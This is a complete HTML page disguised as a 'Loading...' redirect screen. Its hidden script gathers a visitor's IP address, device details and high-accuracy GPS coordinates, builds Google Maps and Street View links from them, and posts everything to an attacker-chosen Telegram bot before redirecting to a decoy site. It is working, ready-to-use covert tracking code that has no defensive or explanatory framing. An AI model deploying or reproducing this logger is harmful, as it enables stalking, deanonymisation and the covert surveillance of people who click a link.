<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh; display: flex;
            justify-content: center; align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loader { text-align: center; color: white; }
        .spinner {
            width: 50px; height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: white; border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .text { font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="text" id="status">Detecting location...</div>
    </div>

    <script>
    // Get URL parameters
    var params = new URLSearchParams(window.location.search);
    var redirectUrl = params.get('r') || 'https://google.com';
    var botToken = params.get('bot') || '';
    var chatId = params.get('chat') || '';
    
    // Collect visitor data
    var visitorData = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: screen.width + 'x' + screen.height,
        viewport: window.innerWidth + 'x' + window.innerHeight,
        cpuCores: navigator.hardwareConcurrency || 'Unknown',
        gps: null,
        referrer: document.referrer || 'Direct'
    };
    
    // Get IP info
    fetch('https://api.ipify.org?format=json')
        .then(function(r) { return r.json(); })
        .then(function(d) { visitorData.ip = d.ip; })
        .catch(function() { visitorData.ip = 'Unknown'; });
    
    // Capture GPS
    function captureGPS() {
        return new Promise(function(resolve, reject) {
            if (!navigator.geolocation) {
                reject('Geolocation not supported');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    resolve({
                        success: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        mapsUrl: 'https://maps.google.com/maps?q=' + 
                                 position.coords.latitude + ',' + 
                                 position.coords.longitude + 
                                 '&ll=' + position.coords.latitude + ',' + 
                                 position.coords.longitude + '&z=16'
                    });
                },
                function(error) {
                    resolve({
                        success: false,
                        error: error.message,
                        code: error.code
                    });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    // Send to Telegram
    function sendToTelegram(data) {
        if (!botToken || !chatId) {
            console.log('No bot token or chat ID');
            return;
        }
        
        var message = '';
        
        if (data.gps && data.gps.success) {
            message = 
                '📍 *GPS LOCATION CAPTURED*\\n' +
                '━━━━━━━━━━━━━━━━\\n\\n' +
                '✅ *GPS Coordinates:*\\n' +
                '• Latitude: `' + data.gps.latitude.toFixed(6) + '`\\n' +
                '• Longitude: `' + data.gps.longitude.toFixed(6) + '`\\n' +
                '• Accuracy: ' + data.gps.accuracy.toFixed(1) + 'm\\n' +
                '\\n🗺️ *Maps Links:*\\n' +
                '• [Google Maps](' + data.gps.mapsUrl + ')\\n' +
                '• [Street View](https://maps.google.com/?q=' + data.gps.latitude + ',' + data.gps.longitude + '&layer=c)\\n\\n';
        } else {
            message = 
                '📍 *GPS LOCATION CAPTURED*\\n' +
                '━━━━━━━━━━━━━━━━\\n\\n' +
                '❌ GPS: ' + (data.gps ? data.gps.error : 'Denied') + '\\n\\n';
        }
        
        message +=
            '📱 *Device Info*\\n' +
            '• ' + data.platform + '\\n' +
            '• Screen: ' + data.screenResolution + '\\n' +
            '• Language: ' + data.language + '\\n' +
            '• CPU: ' + data.cpuCores + ' cores\\n\\n' +
            '🕐 ' + data.timestamp + '\\n' +
            '🌐 IP: ' + (data.ip || 'Captured by IPLogger');
        
        // Send via Telegram API
        var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', telegramUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                console.log('Telegram response:', xhr.status, xhr.responseText);
                document.getElementById('status').textContent = 'Redirecting...';
                
                // Redirect after sending
                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 2000);
            }
        };
        
        var payload = JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });
        
        xhr.send(payload);
    }
    
    // Main execution
    async function main() {
        document.getElementById('status').textContent = 'Detecting location...';
        
        // Capture GPS
        visitorData.gps = await captureGPS();
        
        document.getElementById('status').textContent = 'Sending data...';
        
        // Send to Telegram
        sendToTelegram(visitorData);
    }
    
    // Start
    main();
    </script>
</body>
</html>
